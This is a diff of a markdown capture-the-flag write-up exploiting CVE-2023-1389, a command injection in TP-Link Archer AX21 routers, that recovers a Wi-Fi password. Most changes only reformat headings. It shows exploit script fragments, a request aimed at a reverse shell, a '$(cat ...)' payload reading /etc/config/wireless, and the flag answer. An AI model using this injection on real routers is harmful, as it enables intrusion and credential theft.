@@ -25,7 +25,7 @@ The objective is to gain access to the router configuration and the password it 
 <summary>Click to expand</summary>
 
 
-## Device Information
+Device Information
 
 ![Router logon screen showing Archer AX21 device information](media/image1.png)
 
@@ -35,7 +35,7 @@ TP-Link Archer AX21 (AX1800) firmware versions before 1.1.4 Build 20230219 conta
 
 The following is a recent, known vulnerability. While the firmware version suggests it is patched, it needs to be tested.
 
-## CVE-2023-1389 -- Command Injection / Remote Code Execution
+CVE-2023-1389 -- Command Injection / Remote Code Execution
 
 - **Description:** A command injection vulnerability exists in the Archer AX21 firmware (before version 1.1.4 Build 20230219). Attackers can send crafted POST requests to the router's web management interface, specifically the `/cgi-bin/luci;stok=/locale` endpoint, to inject commands.
 
@@ -47,7 +47,7 @@ The following is a recent, known vulnerability. While the firmware version sugge
 
 - **Mitigation:** TP-Link released patched firmware (v1.1.4 Build 20230219 and later). Devices linked to a TP-Link ID can receive update notifications automatically via the web interface or Tether app.
 
-## Exploit Code Analysis
+Exploit Code Analysis
 
 ![Exploit-db entry for CVE-2023-1389](media/image2.png)
 
@@ -105,7 +105,7 @@ r = requests.get(url_command, verify=False)
 r = requests.get(url_command, verify=False)
 ```
 
-### Key Component of the Script
+Key portion of the script:
 
 ```python
 # URL to obtain the reverse shell
@@ -114,19 +114,13 @@ url_command = "https://" + args.router + "/cgi-bin/luci/;stok=/locale?form=count
 # Send the URL twice to run the command. Sending twice is necessary for the attack
 ```
 
-## Exploitation Process
-
 ![Testing GET request structure showing 200 OK response](media/image3.png)
 
 Work with the structure of the GET request until you get a **200 OK** response, indicating that the structure is valid.
 
 Once the structure is verified, insert a payload.
 
-### About the Wireless Configuration File
-
 On the TP-Link Archer AX21, the file `/etc/config/wireless` is part of the **OpenWrt-style configuration system** used in TP-Link firmware. It stores the **wireless interface definitions** — things like SSIDs, encryption settings, channels, and radio parameters. However, in the stock TP-Link firmware, this file is not normally user-accessible; it's managed internally by the router's web interface and app. If you flash the router with **OpenWrt**, then `/etc/config/wireless` becomes editable and contains the full wireless configuration in a structured text format.
-
-### Simple Payload Example
 
 The simplest payload is to print the file:
 
@@ -135,8 +129,6 @@ $(cat%20/etc/config/wireless)
 ```
 
 ![Payload execution showing wireless configuration file contents](media/image4.png)
-
-## Result
 
 **Answer: SprinklesAndPackets2025!**
 
